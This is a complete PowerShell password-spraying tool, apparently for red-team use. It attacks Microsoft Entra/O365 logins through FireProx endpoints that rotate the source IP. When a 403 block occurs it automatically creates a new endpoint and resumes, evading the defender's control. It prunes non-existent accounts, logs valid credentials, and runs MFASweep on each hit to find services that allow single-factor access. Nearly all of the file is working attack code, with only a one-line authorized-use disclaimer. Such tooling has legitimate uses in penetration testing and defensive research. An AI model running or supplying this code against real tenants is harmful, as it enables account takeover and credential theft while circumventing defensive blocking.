<#
.SYNOPSIS
    Sirocco - Azure/O365 password spraying through self-rotating FireProx
    endpoints, with automatic 403/Forbidden recovery, full attempt logging,
    and a user-list refinery that prunes accounts that don't exist in Entra.

.DESCRIPTION
    Sirocco sprays Microsoft Online (Azure/Entra/O365) accounts via a FireProx
    API Gateway endpoint so each request leaves from a rotating source IP.

    Features:
      1. Creates a fresh FireProx endpoint at start (unless -Url is supplied).
      2. Feeds that endpoint URL into the spray engine.
      3. On a "Forbidden" (HTTP 403 from API Gateway / WAF) response, it
         provisions a NEW FireProx endpoint and RESUMES from the user that
         failed -- it never restarts the spray from the beginning.
      4. Writes a per-attempt CSV log (timestamp, user, password, result),
         a valid-creds file, and a run transcript for client deliverables.
      5. USER REFINERY: when a response says the user/tenant does not exist,
         that user is pruned from the user list. The list file is rewritten
         (after a one-time backup) so subsequent passwords this run -- and all
         future runs against the same list -- skip non-existent accounts.
      6. MFA SWEEP: when -MFASweepPath is supplied, each successful credential is
         immediately run through MFASweep (non-interactively) to find which
         Microsoft services allow single-factor access. Results are logged.

    Request/response handling mirrors MSOLSpray and the MFA sweep reuses
    MFASweep -- both by Beau Bullock (@dafthack). See MSOLSpray/MSOLSpray.ps1 for
    the reference spray implementation.

.EXAMPLE
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" -Region us-east-1

.EXAMPLE
    # Reuse an existing FireProx URL and disable list refining
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -Url https://abc123.execute-api.us-east-1.amazonaws.com/fireprox `
        -AccessKey "AKIA..." -SecretAccessKey "xxxxx" -NoRefine

.EXAMPLE
    # Run an MFA sweep against every credential that sprays successfully
    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
        -FireProxPath /path/to/fireprox/fire.py `
        -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" `
        -MFASweepPath /path/to/MFASweep/MFASweep.ps1 -IncludeADFS

.NOTES
    Authorized security testing only. Passing AWS keys on the command line
    exposes them to the process list; prefer -AwsProfile / environment creds.
#>

[CmdletBinding()]
param (
    [Parameter(Mandatory = $true)]
    [string]$UserListPath,

    [Parameter(Mandatory = $true)]
    [string]$PasswordListPath,

    # Optional starting FireProx URL. If omitted, one is created automatically.
    [Parameter(Mandatory = $false)]
    [string]$Url = "",

    # ----- FireProx / AWS configuration (used to create & rotate endpoints) -----
    [Parameter(Mandatory = $false)]
    [string]$AwsProfile = "",

    [Parameter(Mandatory = $false)]
    [string]$AccessKey = "",

    [Parameter(Mandatory = $false)]
    [string]$SecretAccessKey = "",

    [Parameter(Mandatory = $false)]
    [string]$Region = "us-east-1",

    # Path to fireprox fire.py as seen by the launcher (e.g. a WSL/Linux path).
    [Parameter(Mandatory = $true)]
    [string]$FireProxPath,

    # The real upstream URL that FireProx proxies to.
    [Parameter(Mandatory = $false)]
    [string]$TargetUrl = "https://login.microsoft.com/",

    # How fire.py is launched from PowerShell. Default assumes WSL.
    [Parameter(Mandatory = $false)]
    [string]$Launcher = "wsl",

    # ----- Spray behaviour -----
    [Parameter(Mandatory = $false)]
    [int]$SleepSeconds = (2 * 60 * 60),   # pause between passwords (default 2h)

    [Parameter(Mandatory = $false)]
    [int]$MaxRotations = 10,              # max new endpoints per password round

    [Parameter(Mandatory = $false)]
    [string]$LogDirectory = ".\logs",

    # ----- User refinery -----
    # Disable pruning of non-existent users from the user list.
    [Parameter(Mandatory = $false)]
    [switch]$NoRefine,

    # Also prune users whose tenant doesn't exist (whole domain not on Azure).
    [Parameter(Mandatory = $false)]
    [switch]$RefineTenants,

    # ----- MFA sweep -----
    # Path to MFASweep.ps1. When supplied, every successful spray result is
    # followed by an MFA sweep against that credential. Omit to disable.
    [Parameter(Mandatory = $false)]
    [string]$MFASweepPath = "",

    # Include the on-prem ADFS login attempt in the MFA sweep.
    [Parameter(Mandatory = $false)]
    [switch]$IncludeADFS
)

# ----------------------------------------------------------------------------
# Banner
# ----------------------------------------------------------------------------
Write-Host @"

   ____  _
  / ___|(_)_ __ ___   ___ ___ ___
  \___ \| | '__/ _ \ / __/ __/ _ \
   ___) | | | | (_) | (_| (_| (_) |
  |____/|_|_|  \___/ \___\___\___/   Azure/Entra spray + FireProx rotation

"@ -ForegroundColor Cyan

# ----------------------------------------------------------------------------
# Logging setup
# ----------------------------------------------------------------------------
if (-not (Test-Path $LogDirectory)) {
    New-Item -ItemType Directory -Path $LogDirectory -Force | Out-Null
}
$stamp            = Get-Date -Format "yyyyMMdd_HHmmss"
$script:CsvLog    = Join-Path $LogDirectory "spray_attempts_$stamp.csv"
$script:RunLog    = Join-Path $LogDirectory "spray_run_$stamp.log"
$script:ValidLog  = Join-Path $LogDirectory "valid_creds_$stamp.txt"
$script:Endpoints = Join-Path $LogDirectory "fireprox_endpoints_$stamp.txt"
$script:RemovedLog = Join-Path $LogDirectory "refinery_removed_$stamp.txt"
$script:MfaCsv     = Join-Path $LogDirectory "mfa_results_$stamp.csv"
$script:MfaRawLog  = Join-Path $LogDirectory "mfa_raw_$stamp.log"

# Case-insensitive set of users found NOT to exist in Azure/Entra.
$script:InvalidUsers = New-Object System.Collections.Generic.HashSet[string]([System.StringComparer]::OrdinalIgnoreCase)

function Write-RunLog {
    param([string]$Message, [string]$Color = "Gray")
    $line = "[{0}] {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
    Write-Host $line -ForegroundColor $Color
    Add-Content -Path $script:RunLog -Value $line
}

function Write-Attempt {
    param(
        [string]$Username,
        [string]$Password,
        [string]$Result,
        [string]$Detail = "",
        [string]$Endpoint = ""
    )
    [pscustomobject]@{
        Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        Username  = $Username
        Password  = $Password
        Result    = $Result
        Detail    = $Detail
        Endpoint  = $Endpoint
    } | Export-Csv -Path $script:CsvLog -Append -NoTypeInformation
}

# ----------------------------------------------------------------------------
# FireProx: create a new endpoint and return its base URL (no trailing slash)
# ----------------------------------------------------------------------------
function New-FireProxUrl {
    if (-not $AccessKey -or -not $SecretAccessKey) {
        throw "Cannot create a FireProx endpoint: -AccessKey and -SecretAccessKey are required."
    }

    $argList = @($Launcher, "python3", $FireProxPath)
    if ($AwsProfile) { $argList += @("--profile_name", $AwsProfile) }
    $argList += @(
        "--secret_access_key", $SecretAccessKey,
        "--access_key",        $AccessKey,
        "--region",            $Region,
        "--command",           "create",
        "--url",               $TargetUrl
    )

    Write-RunLog "Creating new FireProx endpoint (target: $TargetUrl)..." "Cyan"
    $exe  = $argList[0]
    $rest = $argList[1..($argList.Count - 1)]
    $output = (& $exe @rest 2>&1 | Out-String)

    $m = [regex]::Match($output, 'https://[a-z0-9]+\.execute-api\.[a-z0-9\-]+\.amazonaws\.com/fireprox/?')
    if (-not $m.Success) {
        Write-RunLog "FireProx output:`n$output" "Red"
        throw "Failed to parse a FireProx URL from fire.py output."
    }

    $newUrl = $m.Value.TrimEnd('/')
    $apiId  = ([regex]::Match($newUrl, 'https://([a-z0-9]+)\.execute-api')).Groups[1].Value
    Write-RunLog "New FireProx endpoint ready: $newUrl (api_id: $apiId)" "Green"
    Add-Content -Path $script:Endpoints -Value ("{0}`t{1}`t{2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $apiId, $newUrl)
    return $newUrl
}

# ----------------------------------------------------------------------------
# Single spray request. Returns a result object.
#   .Forbidden  = endpoint is blocked, rotate it.
#   .UserAbsent = user/tenant does not exist (refinery candidate).
# ----------------------------------------------------------------------------
function Invoke-SprayRequest {
    param(
        [string]$Endpoint,
        [string]$Username,
        [string]$Password
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $BodyParams = @{
        'resource'    = 'https://graph.windows.net'
        'client_id'   = '1b730954-1685-4b74-9bfd-dac224a7b894'
        'client_info' = '1'
        'grant_type'  = 'password'
        'username'    = $Username
        'password'    = $Password
        'scope'       = 'openid'
    }
    $PostHeaders = @{ 'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded' }

    $RespErr = $null
    $webrequest = Invoke-WebRequest "$Endpoint/common/oauth2/token" -Method Post `
        -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr -UseBasicParsing

    if (($webrequest.StatusCode -eq 403) -or
        ($RespErr -match 'Forbidden') -or ($RespErr -match '\(403\)')) {
        return [pscustomobject]@{ Result = "FORBIDDEN"; Detail = "Endpoint blocked (403/Forbidden)"; Success = $false; Forbidden = $true; UserAbsent = $false }
    }

    if ($webrequest.StatusCode -eq 200) {
        return [pscustomobject]@{ Result = "SUCCESS"; Detail = "Valid credentials"; Success = $true; Forbidden = $false; UserAbsent = $false }
    }

    switch -Regex ("$RespErr") {
        'AADSTS50126' { return [pscustomobject]@{ Result = "INVALID-PASSWORD"; Detail = ""; Success = $false; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50128|AADSTS50059' { return [pscustomobject]@{ Result = "INVALID-TENANT"; Detail = "Tenant doesn't exist"; Success = $false; Forbidden = $false; UserAbsent = $RefineTenants.IsPresent } }
        'AADSTS50034' { return [pscustomobject]@{ Result = "INVALID-USER"; Detail = "User doesn't exist"; Success = $false; Forbidden = $false; UserAbsent = $true } }
        'AADSTS50079|AADSTS50076' { return [pscustomobject]@{ Result = "SUCCESS-MFA"; Detail = "Valid creds; MFA (Microsoft) in use"; Success = $true; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50158' { return [pscustomobject]@{ Result = "SUCCESS-CONDITIONAL-ACCESS"; Detail = "Valid creds; conditional access (DUO/other) in use"; Success = $true; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50053' { return [pscustomobject]@{ Result = "LOCKED"; Detail = "Account locked / Smart Lockout"; Success = $false; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50057' { return [pscustomobject]@{ Result = "DISABLED"; Detail = "Account disabled"; Success = $false; Forbidden = $false; UserAbsent = $false } }
        'AADSTS50055' { return [pscustomobject]@{ Result = "SUCCESS-EXPIRED"; Detail = "Valid creds; password expired"; Success = $true; Forbidden = $false; UserAbsent = $false } }
        default       { return [pscustomobject]@{ Result = "UNKNOWN-ERROR"; Detail = ("$RespErr" -replace '\s+', ' ').Trim(); Success = $false; Forbidden = $false; UserAbsent = $false } }
    }
}

# ----------------------------------------------------------------------------
# Refinery: rewrite the user list file with non-existent users removed.
# A one-time backup of the original list is kept in the log directory.
# ----------------------------------------------------------------------------
function Save-RefinedUserList {
    if ($NoRefine) { return }
    $valid = @($script:AllUsers | Where-Object { -not $script:InvalidUsers.Contains($_) })
    Set-Content -Path $UserListPath -Value $valid -Encoding ascii
}

function Remove-User {
    param([string]$Username, [string]$Reason)
    if ($NoRefine) { return }
    if ($script:InvalidUsers.Add($Username)) {
        Write-RunLog "Refinery: pruning '$Username' ($Reason)." "Magenta"
        Add-Content -Path $script:RemovedLog -Value ("{0}`t{1}`t{2}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Username, $Reason)
    }
}

# ----------------------------------------------------------------------------
# MFA sweep: reuses MFASweep's per-service auth functions (dot-sourced) but
# drives them non-interactively (no prompts, no ADFS unless -IncludeADFS).
# Runs once per successful credential and logs which services allow single-
# factor access. All of MFASweep's noisy console output is captured to file.
# ----------------------------------------------------------------------------
function Invoke-SiroccoMfaSweep {
    param([string]$Username, [string]$Password)

    Write-RunLog "Running MFA sweep for $Username ..." "Cyan"

    # Reset the result globals MFASweep's functions write into.
    $global:graphresult = "NO"; $global:smresult = "NO"
    $global:o365wresult = "NO"; $global:o365lresult = "NO"; $global:o365mresult = "NO"
    $global:o365apresult = "NO"; $global:o365ipresult = "NO"; $global:o365wpresult = "NO"
    $global:ewsresult = "NO"; $global:asyncresult = "NO"; $global:adfsresult = "NO"

    # Run every check, swallowing MFASweep's console output into the raw log.
    Add-Content -Path $script:MfaRawLog -Value ("`n===== MFA sweep: {0} @ {1} =====" -f $Username, (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
    try {
        & {
            Invoke-GraphAPIAuth          -Username $Username -Password $Password
            Invoke-AzureManagementAPIAuth -Username $Username -Password $Password
            foreach ($ua in @('Windows','Linux','MacOS','Android','iPhone','WindowsPhone')) {
                Invoke-M365WebPortalAuth -Username $Username -Password $Password -UAtype $ua
            }
            Invoke-EWSAuth            -Username $Username -Password $Password
            Invoke-O365ActiveSyncAuth -Username $Username -Password $Password
            if ($IncludeADFS) { Invoke-ADFSAuth -Username $Username -Password $Password }
        } *>> $script:MfaRawLog
    }
    catch {
        Write-RunLog "MFA sweep error for ${Username}: $($_.Exception.Message)" "Red"
        Add-Content -Path $script:MfaRawLog -Value "ERROR: $($_.Exception.Message)"
    }

    # Map globals -> services and persist.
    $services = [ordered]@{
        "Microsoft Graph API"               = $global:graphresult
        "Microsoft Service Management API"  = $global:smresult
        "M365 w/ Windows UA"                = $global:o365wresult
        "M365 w/ Linux UA"                  = $global:o365lresult
        "M365 w/ MacOS UA"                  = $global:o365mresult
        "M365 w/ Android UA"                = $global:o365apresult
        "M365 w/ iPhone UA"                 = $global:o365ipresult
        "M365 w/ Windows Phone UA"          = $global:o365wpresult
        "Exchange Web Services (BASIC)"     = $global:ewsresult
        "Active Sync (BASIC)"               = $global:asyncresult
    }
    if ($IncludeADFS) { $services["ADFS"] = $global:adfsresult }

    $singleFactor = @()
    foreach ($svc in $services.Keys) {
        $res = "$($services[$svc])" -replace '\{.*\}', ''
        $res = if ($res -match 'YES') { "YES" } else { "NO" }
        if ($res -eq "YES") { $singleFactor += $svc }
        [pscustomobject]@{
            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            Username  = $Username
            Password  = $Password
            Service   = $svc
            SingleFactorAccess = $res
        } | Export-Csv -Path $script:MfaCsv -Append -NoTypeInformation
    }

    if ($singleFactor.Count -gt 0) {
        Write-RunLog "MFA sweep $Username : SINGLE-FACTOR access on -> $($singleFactor -join ', ')" "Green"
    }
    else {
        Write-RunLog "MFA sweep $Username : no single-factor access found (MFA likely enforced everywhere)." "Yellow"
    }
}

# ----------------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------------
function Invoke-Sirocco {
    if (-not (Test-Path $UserListPath))     { throw "User list not found: $UserListPath" }
    if (-not (Test-Path $PasswordListPath)) { throw "Password list not found: $PasswordListPath" }

    $script:AllUsers = @(Get-Content $UserListPath     | Where-Object { $_.Trim() -ne "" })
    $passwords       = @(Get-Content $PasswordListPath | Where-Object { $_.Trim() -ne "" })

    if ($script:AllUsers.Count -eq 0) { throw "User list is empty." }
    if ($passwords.Count -eq 0)       { throw "Password list is empty." }

    Write-RunLog "Starting spray: $($script:AllUsers.Count) users x $($passwords.Count) passwords." "Yellow"
    Write-RunLog "Attempt log : $script:CsvLog"
    Write-RunLog "Run log     : $script:RunLog"
    Write-RunLog "Valid creds : $script:ValidLog"

    # Back up the original user list once (refinery rewrites it in place).
    if (-not $NoRefine) {
        $backup = Join-Path $LogDirectory "userlist_backup_$stamp.txt"
        Copy-Item -Path $UserListPath -Destination $backup -Force
        Write-RunLog "User refinery ENABLED. Original list backed up to: $backup" "Magenta"
        Write-RunLog "Removed users will be logged to: $script:RemovedLog" "Magenta"
    }
    else {
        Write-RunLog "User refinery DISABLED (-NoRefine)." "DarkGray"
    }

    # Load MFASweep's auth functions if a path was supplied.
    $script:MfaEnabled = $false
    if ($MFASweepPath) {
        if (-not (Test-Path $MFASweepPath)) { throw "MFASweep script not found: $MFASweepPath" }
        . $MFASweepPath
        if (-not (Get-Command Invoke-GraphAPIAuth -ErrorAction SilentlyContinue)) {
            throw "Dot-sourcing '$MFASweepPath' did not define the expected MFASweep functions."
        }
        $script:MfaEnabled = $true
        Write-RunLog "MFA sweep ENABLED. Per-service results -> $script:MfaCsv (raw output -> $script:MfaRawLog)." "Cyan"
        if ($IncludeADFS) { Write-RunLog "MFA sweep will include the on-prem ADFS check." "Cyan" }
    }
    else {
        Write-RunLog "MFA sweep DISABLED (supply -MFASweepPath to enable)." "DarkGray"
    }

    # Establish the starting endpoint.
    if ($Url) {
        $script:CurrentUrl = $Url.TrimEnd('/')
        Write-RunLog "Using supplied FireProx URL: $script:CurrentUrl" "Cyan"
    }
    else {
        $script:CurrentUrl = New-FireProxUrl
    }

    foreach ($password in $passwords) {
        # Only target users still believed to exist (refinery skips pruned ones).
        $targets = @($script:AllUsers | Where-Object { -not $script:InvalidUsers.Contains($_) })
        Write-RunLog "Spraying password: $password  ($($targets.Count) live users)" "Yellow"

        $rotations = 0
        $i = 0

        while ($i -lt $targets.Count) {
            $user = $targets[$i]
            # Single in-place progress bar instead of a new console line per user.
            Write-Progress -Activity "Spraying password '$password'" `
                -Status ("{0} of {1} users  (last: {2})" -f ($i + 1), $targets.Count, $user) `
                -PercentComplete ((($i + 1) / $targets.Count) * 100)

            $r = Invoke-SprayRequest -Endpoint $script:CurrentUrl -Username $user -Password $password

            if ($r.Forbidden) {
                $rotations++
                Write-RunLog "FORBIDDEN at user '$user' on $script:CurrentUrl. Rotating (rotation $rotations/$MaxRotations) and resuming from this user." "Red"
                Write-Attempt -Username $user -Password $password -Result "FORBIDDEN-ROTATE" -Detail "Rotation $rotations" -Endpoint $script:CurrentUrl

                if ($rotations -gt $MaxRotations) {
                    throw "Exceeded MaxRotations ($MaxRotations) for password '$password'. Aborting to avoid creating endless endpoints."
                }
                $script:CurrentUrl = New-FireProxUrl
                continue   # retry the SAME user -> resume, don't advance
            }

            Write-Attempt -Username $user -Password $password -Result $r.Result -Detail $r.Detail -Endpoint $script:CurrentUrl

            if ($r.Success) {
                $msg = "[SUCCESS] $user : $password"
                if ($r.Detail) { $msg += " ($($r.Detail))" }
                Write-RunLog $msg "Green"
                Add-Content -Path $script:ValidLog -Value ("{0}  {1} : {2}  [{3}] {4}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $user, $password, $r.Result, $r.Detail)

                # Run the MFA sweep against the freshly-confirmed credential.
                if ($script:MfaEnabled) {
                    Invoke-SiroccoMfaSweep -Username $user -Password $password
                }
            }
            elseif ($r.UserAbsent) {
                Remove-User -Username $user -Reason $r.Result
            }

            $i++
        }

        Write-Progress -Activity "Spraying password '$password'" -Completed

        # Persist the refined list after each password round.
        Save-RefinedUserList

        Write-RunLog "Finished password '$password'. Pruned so far: $($script:InvalidUsers.Count)." "Yellow"
        if ($password -ne $passwords[-1]) {
            Write-RunLog "Sleeping for $SleepSeconds seconds." "Yellow"
            Start-Sleep -Seconds $SleepSeconds
        }
    }

    Save-RefinedUserList
    Write-RunLog "Spray complete. $($script:InvalidUsers.Count) non-existent users pruned from $UserListPath." "Green"
    Write-RunLog "Endpoints created are listed in: $script:Endpoints" "Green"
    Write-RunLog "Tip: delete endpoints with: $Launcher python3 `"$FireProxPath`" --access_key ... --secret_access_key ... --region $Region --command delete --api_id <id>" "DarkGray"
}

Invoke-Sirocco
